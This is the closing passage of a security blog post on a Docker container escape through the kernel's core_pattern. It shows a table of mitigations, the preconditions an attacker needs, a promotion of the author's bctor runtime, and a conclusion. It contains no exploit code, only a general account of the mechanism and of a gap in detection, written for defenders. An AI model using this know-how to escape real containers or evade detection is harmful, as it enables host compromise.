    <text x="330" y="96"  fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">removes every precondition at once</text>

    <text x="34"  y="146" fill="#d17bd0" font-weight="700">read-only /proc/sys</text>
    <text x="330" y="146" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">the write fails with EROFS</text>

    <rect x="24"  y="166" width="288" height="50" fill="#20252d"/>
    <text x="34"  y="196" fill="#d17bd0" font-weight="700">AppArmor docker-default</text>
    <text x="330" y="196" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">writes under /proc/sys/kernel denied</text>

    <text x="34"  y="246" fill="#d17bd0" font-weight="700">userns-remap</text>
    <text x="330" y="246" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">daemon refuses privileged containers</text>

    <rect x="24"  y="266" width="288" height="50" fill="#20252d"/>
    <text x="34"  y="296" fill="#d17bd0" font-weight="700">drop CAP_SYS_ADMIN</text>
    <text x="330" y="296" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">only stops remounting /proc/sys read-write</text>

    <text x="34"  y="346" fill="#d17bd0" font-weight="700">seccomp default profile</text>
    <text x="330" y="346" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">blocks neighbouring syscalls (init_module...)</text>

    <rect x="24"  y="366" width="288" height="50" fill="#20252d"/>
    <text x="34"  y="396" fill="#d17bd0" font-weight="700">no_new_privs</text>
    <text x="330" y="396" fill="#eaeaea" font-family="-apple-system,Segoe UI,Roboto,sans-serif" font-size="12.5">no privilege regain across exec</text>
  </g>
  <!-- row dividers -->
  <g stroke="#282e37" stroke-width="1">
    <line x1="24" y1="116" x2="856" y2="116"/><line x1="24" y1="166" x2="856" y2="166"/>
    <line x1="24" y1="216" x2="856" y2="216"/><line x1="24" y1="266" x2="856" y2="266"/>
    <line x1="24" y1="316" x2="856" y2="316"/><line x1="24" y1="366" x2="856" y2="366"/>
  </g>
  <!-- green "breaks escape" ticks -->
  <g>
    <circle cx="838" cy="91"  r="7" fill="#153a1e"/><path d="M834,91  l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="141" r="7" fill="#153a1e"/><path d="M834,141 l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="191" r="7" fill="#153a1e"/><path d="M834,191 l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="241" r="7" fill="#153a1e"/><path d="M834,241 l3,3 l5-6" stroke="#46a758" stroke-width="1.8" fill="none"/>
    <circle cx="838" cy="291" r="7" fill="#20252d" stroke="#3a4048" stroke-width="1.5"/><line x1="835" y1="291" x2="841" y2="291" stroke="#6a727c" stroke-width="1.8"/>
    <circle cx="838" cy="341" r="7" fill="#20252d" stroke="#3a4048" stroke-width="1.5"/><line x1="835" y1="341" x2="841" y2="341" stroke="#6a727c" stroke-width="1.8"/>
    <circle cx="838" cy="391" r="7" fill="#20252d" stroke="#3a4048" stroke-width="1.5"/><line x1="835" y1="391" x2="841" y2="391" stroke="#6a727c" stroke-width="1.8"/>
  </g>
</svg>
</div>

To land this escape an attacker needs a writable `/proc/sys`, the host's own uid 0, no LSM rule covering `/proc/sys/kernel`, and a handler path the kernel can reach. Removing any one of these breaks it. Dropping `CAP_SYS_ADMIN` covers a narrower case, remounting a read-only `/proc/sys`. The `userns-remap` row is the one that stopped me by accident: my WSL2 Docker had it enabled, so the daemon refused the privileged container until I forced `--userns=host`.

## Defaults done right

Here I will point to my own runtime, [bctor](https://github.com/Johnermac/bctor), which is the reason this series exists. bctor is a from-scratch container runtime I have been building to learn these primitives. Its design rule is that every isolation control is on by default, and weakening it must be an explicit opt-in.

Against this escape, a default bctor container:

- drops `CAP_SYS_ADMIN` and every other capability, so the sysctl write is denied,
- mounts `/proc` read-only and masks the sensitive paths, so there is nothing to write,
- installs a seccomp profile, removing the neighbouring escape syscalls,
- sets `no_new_privs`.

The first two stop this write outright. The last two do not touch this path, but they close the neighbouring escapes and harden the rest. None can be turned off without an explicit flag.

---

# Conclusion

`core_pattern` is a 20-year-old kernel feature doing what it was designed to do, run a program on a core dump, abused by a container that was given too much privilege. That makes it a good example to learn from:

- The attack is short once you see that `core_pattern` is host-global and the `upperdir` maps both ways.
- The detection is a lesson on its own: the default ruleset caught the noise around my PoC and missed the escape. Useful detection watches the mechanism.
- The defense is layered: a read-only `/proc/sys`, an LSM rule over `/proc/sys/kernel`, and userns-remap each stop this write on their own, while seccomp and `no_new_privs` close the neighbouring escapes.

> Next in the series I will take another escape through the same attack, detect, defend cycle.

Check the repo: [BCTOR GITHUB REPO](https://github.com/Johnermac/bctor)

> Follow me if this was useful. Hope you liked it! :)

# References

https://github.com/elastic/detection-rules/issues/6216

https://pwning.systems/posts/escaping-containers-for-fun/

https://man7.org/linux/man-pages/man5/core.5.html

https://falco.org/docs/

https://attack.mitre.org/techniques/T1611/
